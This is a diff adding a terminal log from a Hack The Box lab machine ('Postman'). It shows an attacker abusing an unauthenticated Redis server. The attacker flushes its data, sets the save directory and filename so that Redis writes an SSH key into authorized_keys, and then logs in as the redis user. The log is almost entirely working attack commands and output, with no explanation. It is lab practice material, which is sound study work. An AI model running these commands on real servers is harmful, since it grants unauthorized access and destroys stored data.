@@ -1,0 +1,34 @@
+
+t@kali:~/htb/postman/redis-stable/src# ./redis-cli -h 10.10.10.160 flushall
+OK
+root@kali:~/htb/postman/redis-stable/src# cat foo.txt | ./redis-cli -h 10.10.10.160 -x set foobar
+OK
+root@kali:~/htb/postman/redis-stable/src# ./redis-cli -h 10.10.10.160
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis/.ssh"
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379> 
+root@kali:~/htb/postman/redis-stable/src# cd ..
+root@kali:~/htb/postman/redis-stable# cd ..
+root@kali:~/htb/postman# ssh -i id_rsa redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Dec  6 23:48:12 2019 from 10.10.15.148
+redis@Postman:~$ 
+
